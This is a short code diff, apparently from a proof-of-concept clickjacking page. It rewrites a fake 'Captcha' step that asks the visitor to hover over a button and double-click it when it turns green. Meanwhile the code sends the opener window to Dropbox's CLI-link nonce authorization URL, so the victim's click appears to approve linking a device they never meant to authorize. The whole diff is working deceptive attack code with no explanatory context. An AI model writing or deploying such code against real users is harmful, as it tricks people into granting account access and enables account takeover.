@@ -45,12 +45,12 @@
         };
         document.body.appendChild(button);
       } else if (step === '3') {
-        document.body.innerText = 'Captcha: double-click the red button to prove you are human';
+        document.body.innerText = 'Captcha: hover over the red button and double-click it once it turns green to prove you are human';
         const button = document.createElement('button');
-        const x = 700;
-        const y = 275;
         const width = 50;
         const height = 18;
+        const x = window.innerWidth / 2 - width;
+        const y = 275;
         button.style.position = 'absolute';
         button.style.left = x + 'px';
         button.style.top = y + 'px';
@@ -63,6 +63,9 @@
         };
         const stage = () => {
           opener.location = 'https://www.dropbox.com/cli_link_nonce?' + new URLSearchParams({ nonce: nonce }).toString();
+          setTimeout(() => {
+            button.style.backgroundColor = 'green';
+          }, 3000);
         };
         const unstage = () => {
           opener.location = step2URL;
